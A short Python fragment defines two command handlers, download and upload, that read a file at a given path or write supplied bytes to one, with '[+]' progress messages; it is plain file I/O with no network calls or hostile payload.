def download(command):
    path = " ".join(command.args)

    with open(path, "rb") as file:
        command.progress = f"{OK} Reading contents of file"
        contents = file.read()

    return contents.decode()

def upload(command):
    path = " ".join(command.args)

    with open(path, "wb") as file:
        command.progress = f"{OK} Writing contents of file"
        file.write(command.file)

    return "Successfully uploaded file"

OK = "[+]"
